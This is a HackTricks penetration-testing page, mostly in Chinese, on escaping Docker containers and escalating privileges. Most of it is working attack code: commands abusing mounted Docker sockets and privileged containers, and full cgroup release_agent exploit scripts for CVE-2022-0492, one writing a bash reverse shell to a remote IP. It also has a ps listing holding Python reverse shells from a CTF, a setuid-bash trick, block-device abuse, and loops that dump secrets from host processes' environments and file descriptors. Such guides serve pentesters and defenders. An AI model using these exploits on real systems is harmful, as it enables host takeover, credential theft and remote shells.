# Docker越狱/权限提升

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用世界上**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 自动枚举和逃逸

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)：它还可以**枚举容器**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery)：这个工具非常**有用，可以枚举你所在的容器，甚至尝试自动逃逸**
* [**amicontained**](https://github.com/genuinetools/amicontained)：有用的工具，可以获取容器的特权，以找到逃逸的方法
* [**deepce**](https://github.com/stealthcopter/deepce)：用于枚举和逃逸容器的工具
* [**grype**](https://github.com/anchore/grype)：获取镜像中安装的软件中包含的CVE

## 挂载的Docker套接字逃逸

如果你发现**Docker套接字被挂载**在Docker容器内部，你将能够从中逃逸。\
这通常发生在某些原因需要连接到Docker守护程序执行操作的Docker容器中。
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
在这种情况下，您可以使用常规的docker命令与docker守护程序进行通信：
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
如果**docker套接字位于意外位置**，您仍然可以使用带有参数**`-H unix:///path/to/docker.sock`**的**`docker`**命令与其通信。
{% endhint %}

Docker守护程序也可能在端口上进行监听（默认为2375、2376），或者在基于Systemd的系统上，可以通过Systemd套接字`fd://`与Docker守护程序进行通信。

{% hint style="info" %}
此外，还要注意其他高级运行时的运行时套接字：

* dockershim：`unix:///var/run/dockershim.sock`
* containerd：`unix:///run/containerd/containerd.sock`
* cri-o：`unix:///var/run/crio/crio.sock`
* frakti：`unix:///var/run/frakti.sock`
* rktlet：`unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## 特权滥用逃逸

您应该检查容器的特权，如果具有以下任何特权，则可能能够逃逸出容器：**`CAP_SYS_ADMIN`**、**`CAP_SYS_PTRACE`**、**`CAP_SYS_MODULE`**、**`DAC_READ_SEARCH`**、**`DAC_OVERRIDE`**、**`CAP_SYS_RAWIO`**、**`CAP_SYSLOG`**、**`CAP_NET_RAW`**、**`CAP_NET_ADMIN`**

您可以使用**先前提到的自动工具**或以下命令检查当前容器的特权：
```bash
capsh --print
```
在下面的页面中，您可以了解更多关于Linux能力的知识，以及如何滥用它们来逃脱/提升权限：

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## 从特权容器中逃脱

可以通过使用`--privileged`标志或禁用特定的防御措施来创建特权容器：

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

`--privileged`标志引入了重大的安全问题，利用该漏洞需要启用该标志来启动一个docker容器。使用此标志时，容器可以完全访问所有设备，并且没有受到seccomp、AppArmor和Linux能力的限制。您可以在此页面上**阅读有关`--privileged`的所有影响**：

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### 特权 + hostPID

通过这些权限，您可以轻松地**切换到以root身份在主机上运行的进程的命名空间**，比如init（pid:1），只需运行：`nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

在容器中执行以下测试：
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### 特权访问

只需使用特权标志，您就可以尝试访问主机的磁盘或尝试滥用release_agent或其他逃逸方式来逃逸。

在容器中执行以下绕过测试：
```bash
docker run --rm -it --privileged ubuntu bash
```
#### 挂载磁盘 - Poc1

配置良好的Docker容器不会允许执行像 **fdisk -l** 这样的命令。然而，在配置错误的Docker命令中，如果指定了 `--privileged` 或 `--device=/dev/sda1` 标志以及相应的权限，就有可能获取查看主机驱动器的权限。

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

因此，要接管主机机器是微不足道的：
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
#### 挂载磁盘 - Poc2

在容器内部，攻击者可以尝试通过集群创建的可写的 hostPath 卷来进一步访问底层主机操作系统。以下是您可以在容器内部检查的一些常见事项，以查看是否利用了这种攻击向量：
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### 滥用现有的release\_agent进行特权逃逸（[cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)）- PoC1

{% code title="初始PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### 滥用创建的release_agent进行特权逃逸（[cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)）- PoC2

{% code title="第二个PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

在以下位置找到有关该技术的**解释**：

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### 滥用release\_agent进行特权逃逸，而不知道相对路径 - PoC3

在先前的攻击中，透露了容器在主机文件系统中的**绝对路径**。然而，并不总是这种情况。在你**不知道容器在主机中的绝对路径**的情况下，你可以使用这种技术：

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
在特权容器中执行PoC应该会产生类似以下输出：
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### 滥用敏感挂载点进行特权逃逸

有几个文件可能被挂载，这些文件提供了关于底层主机的信息。其中一些甚至可能指示主机在发生某些事件时执行某些操作（这将允许攻击者从容器中逃逸出去）。
滥用这些文件可能会导致以下情况发生：

* release_agent（之前已经介绍过）
* [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
* [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
* [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

然而，您可以在此页面中找到其他敏感文件进行检查：

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### 任意挂载点

在许多情况下，您会发现容器从主机挂载了一些卷。如果这个卷没有正确配置，您可能能够访问/修改敏感数据：读取秘密信息，更改ssh授权密钥...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 使用2个shell和主机挂载进行特权提升

如果你以**容器内的root用户身份**访问一个已挂载主机文件夹的容器，并且你已经以非特权用户的身份逃逸到主机并具有对挂载文件夹的读取权限。\
你可以在**容器内的挂载文件夹**中创建一个**bash suid文件**，并从主机上执行它以进行特权提升。
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 使用两个shell进行特权提升

如果您在容器内部具有**root访问权限**，并且已经以非特权用户的身份**逃逸到主机**，则可以滥用这两个shell来在主机内部进行**特权提升**，前提是您在容器内部具有MKNOD功能（默认情况下是有的），如[**此文章中所解释的**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)。

通过这种功能，容器内的root用户被允许**创建块设备文件**。设备文件是用于**访问底层硬件和内核模块**的特殊文件。例如，/dev/sda块设备文件允许**读取系统磁盘上的原始数据**。

Docker通过在容器上设置cgroup策略来确保块设备**无法在容器内部被滥用**，阻止对块设备的读写操作。\
然而，如果在容器内部**创建了一个块设备**，则可以通过位于/proc/PID/root/文件夹中的某个**容器外部的进程**来访问它，限制是该进程必须由**容器外部和内部的同一用户**拥有。

以下是来自[**此篇文章**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)的**利用示例**：
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

如果您可以访问主机的进程，您将能够访问存储在这些进程中的许多敏感信息。运行测试实验室：
```
docker run --rm -it --pid=host ubuntu bash
```
例如，您可以使用类似 `ps auxn` 的命令列出进程，并在命令中搜索敏感信息。

然后，由于您可以**在 /proc/ 中访问主机的每个进程，您可以通过运行以下命令窃取它们的环境变量密钥**：
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
您还可以**访问其他进程的文件描述符并读取其打开的文件**：
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
您还可以**终止进程并导致拒绝服务攻击（DoS）**。

{% hint style="warning" %}
如果您以某种方式拥有容器之外的进程的特权**访问权限**，您可以运行类似`nsenter --target <pid> --all`或`nsenter --target <pid> --mount --net --pid --cgroup`的命令，以便以与该进程相同的ns限制（希望没有）**运行一个shell**。
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
如果一个容器配置了Docker的主机网络驱动（`--network=host`），那么该容器的网络堆栈与Docker主机不隔离（容器共享主机的网络命名空间），并且容器不会被分配独立的IP地址。换句话说，**容器将所有服务直接绑定到主机的IP上**。此外，容器可以**拦截主机发送和接收的所有网络流量**，使用`tcpdump -i eth0`命令。

例如，您可以使用此功能来**嗅探甚至伪造**主机和元数据实例之间的流量。

就像以下示例中所示：

* [Writeup: 如何联系Google SRE：在云SQL中获取shell](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [元数据服务中间人攻击导致提权（EKS / GKE）](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

您还可以访问主机内部绑定到本地主机的**网络服务**，甚至可以访问节点的**元数据权限**（这可能与容器可以访问的权限不同）。

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
如果只有`hostIPC=true`，你可能无法做太多事情。如果主机上的任何进程或其他容器内的进程正在使用主机的**进程间通信机制**（共享内存、信号量数组、消息队列等），你将能够读取/写入这些相同的机制。你首先要查看的地方是`/dev/shm`，因为它在任何具有`hostIPC=true`的容器和主机之间共享。你还需要使用`ipcs`来检查其他IPC机制。

* **检查/dev/shm** - 查看此共享内存位置中的任何文件：`ls -la /dev/shm`
* **检查现有的IPC设施** - 你可以使用`/usr/bin/ipcs`来检查是否正在使用任何IPC设施。使用以下命令进行检查：`ipcs -a`

### 恢复权限

如果系统调用**`unshare`**没有被禁止，你可以通过运行以下命令来恢复所有权限：
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### 通过符号链接滥用用户命名空间

在[https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)的文章中解释了第二种技术，它说明了如何滥用用户命名空间中的绑定挂载，以影响主机内的文件（在该特定情况下，删除文件）。

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## CVEs

### Runc漏洞利用（CVE-2019-5736）

如果您可以以root身份执行`docker exec`（可能需要sudo），则可以尝试通过滥用CVE-2019-5736（[此处](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)有漏洞利用）来提升特权。这种技术基本上会从容器中**覆盖**主机的_**/bin/sh**_二进制文件，因此任何执行docker exec的人都可能触发有效载荷。

根据需要更改有效载荷，并使用`go build main.go`构建main.go。生成的二进制文件应放置在docker容器中以供执行。\
执行时，一旦显示`[+] Overwritten /bin/sh successfully`，您需要从主机机器上执行以下操作：

`docker exec -it <container-name> /bin/sh`

这将触发main.go文件中的有效载荷。

更多信息：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
容器可能还存在其他CVE漏洞，您可以在[https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)中找到列表。
{% endhint %}

## Docker自定义逃逸

### Docker逃逸面

* **命名空间：**进程应通过命名空间与其他进程**完全隔离**，因此无法通过命名空间进行交互（默认情况下无法通过IPC、Unix套接字、网络服务、D-Bus、其他进程的`/proc`进行通信）。
* **Root用户：**默认情况下，运行进程的用户是root用户（但其权限受限）。
* **能力：**Docker保留以下能力：`cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **系统调用：**这些是**root用户无法调用**的系统调用（因为缺乏能力+Seccomp）。其他系统调用可用于尝试逃逸。

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="arm64系统调用" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
